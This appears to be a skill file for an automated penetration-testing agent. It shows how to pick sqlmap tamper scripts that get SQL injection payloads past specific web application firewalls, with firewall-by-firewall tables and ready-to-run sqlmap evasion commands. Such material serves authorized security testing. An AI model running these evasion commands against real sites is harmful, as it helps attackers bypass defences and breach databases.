# Skill: Tamper Script Selection Guide

## Metadata
- Phase: waf_evasion
- Techniques: all
- DB Targets: all
- Risk Level: low-medium
- Prerequisites: WAF identified, DBMS known

## When to Use

Use after identifying the WAF. Tamper scripts modify SQLMap payloads to bypass WAF rules. Selecting the right combination is critical — wrong choices add noise without helping bypass.

## Quick Selection Table

| WAF | Recommended Tampers | Notes |
|-----|--------------------|----|
| **Cloudflare** | `space2comment,randomcase,charencode` | Start with these |
| **ModSecurity** | `modsecurityzeroversioned,space2comment,randomcase` | Version comment bypass |
| **Imperva** | `space2comment,randomcase,between,greatest` | Multiple operators |
| **F5 BIG-IP** | `randomcase,charencode,space2randomblank` | |
| **Akamai** | `between,randomcase,chardoubleencode` | Double encoding effective |
| **Sucuri** | `space2comment,randomcase` | Basic bypasses often enough |
| **Barracuda** | `percentage,randomcase,space2comment` | |
| **AWS WAF** | `charencode,randomcase,between` | |
| **Generic/Unknown** | `space2comment,randomcase` | Universal starting point |

## All Available Tamper Scripts (Key Ones)

### Space Replacement
| Tamper | Transform | DB Support |
|--------|-----------|------------|
| `space2comment` | `SELECT/**/` | All |
| `space2dash` | `SELECT--\nFROM` | All |
| `space2mssqlblank` | Multiple blank chars | MSSQL |
| `space2mysqlblank` | Various whitespace | MySQL |
| `space2randomblank` | Random whitespace | All |

### Case Manipulation
| Tamper | Transform | DB Support |
|--------|-----------|------------|
| `randomcase` | `SeLeCt` | All |
| `uppercase` | `SELECT` -> `SELECT` | All |

### Encoding
| Tamper | Transform | DB Support |
|--------|-----------|------------|
| `charencode` | URL encode all chars | All |
| `chardoubleencode` | Double URL encode | All |
| `base64encode` | Base64 entire payload | All |
| `htmlencode` | HTML entity encode | All |
| `apostrophemask` | `'` -> UTF-8 full-width | All |
| `apostrophenullencode` | `'` -> `%00%27` | All |
| `percentage` | `S%ELECT` | MSSQL |

### Operator Substitution
| Tamper | Transform | DB Support |
|--------|-----------|------------|
| `between` | `>` -> `NOT BETWEEN 0 AND` | All |
| `greatest` | `>` -> `GREATEST()` | MySQL |
| `least` | `<` -> `LEAST()` | MySQL |
| `equaltolike` | `=` -> `LIKE` | All |

### Comment Injection
| Tamper | Transform | DB Support |
|--------|-----------|------------|
| `modsecurityzeroversioned` | `/*!00000SELECT*/` | MySQL |
| `versionedkeywords` | `/*!SELECT*/` | MySQL |
| `versionedmorekeywords` | More versioned comments | MySQL |
| `halfversionedmorekeywords` | Mixed versioning | MySQL |

### Misc Bypasses
| Tamper | Transform | DB Support |
|--------|-----------|------------|
| `appendnullbyte` | Append `%00` | Generic |
| `overlongutf8` | Overlong UTF-8 | All |
| `multiplespaces` | Multiple spaces | All |
| `nonrecursivereplacement` | Replace keywords | All |
| `securesphere` | SecureSphere bypass | All |

## Command Examples

### Basic WAF Bypass
```bash
sqlmap -u "TARGET" \
  --tamper=space2comment,randomcase \
  --random-agent \
  --batch
```

### Cloudflare Bypass
```bash
sqlmap -u "TARGET" \
  --tamper=space2comment,randomcase,charencode \
  --random-agent \
  --delay=1 \
  --batch
```

### ModSecurity Bypass (MySQL)
```bash
sqlmap -u "TARGET" \
  --tamper=modsecurityzeroversioned,space2comment,randomcase \
  --random-agent \
  --dbms=mysql \
  --batch
```

### Heavy Evasion (Unknown WAF)
```bash
sqlmap -u "TARGET" \
  --tamper=between,charencode,space2comment,randomcase \
  --random-agent \
  --delay=2 \
  --threads=1 \
  --batch
```

## Python Utility

```bash
# Auto-select tampers based on identified WAF and DBMS
python utils/tamper_selector.py \
  --waf cloudflare \
  --dbms mysql
```

## Tamper Testing Strategy

1. Start with 1-2 tampers (less noise, easier to debug)
2. Add tampers incrementally if still blocked
3. Test each combination before adding more
4. Use `-v 3` to see modified payloads

```bash
# See what tampers are doing to payloads
sqlmap -u "TARGET" --tamper=space2comment -v 5 --batch
```

## DBMS Compatibility Warnings

Some tampers are DBMS-specific:
- `modsecurityzeroversioned` -> MySQL only
- `versionedkeywords` -> MySQL only
- `space2mssqlblank` -> MSSQL only
- `greatest` / `ifnull2ifisnull` -> MySQL only
- `percentage` -> MSSQL only

Using incompatible tampers causes injection failures.

## Red Flags (wrong skill)
- Tampers applied but still 403 -> try different tamper combination
- Injection success but slow -> tampers are working but add overhead, consider reducing tampers
- Tampers causing syntax errors -> incompatible tamper for DBMS, remove DBMS-specific ones

## Follow-Up
- Tampers selected -> [Tamper Chaining](tamper_chaining.md) for complex scenarios
- Multiple WAFs -> [Encoding Strategies](encoding_strategies.md)
- Specific WAF config -> see `configs/waf_*.cfg` profiles
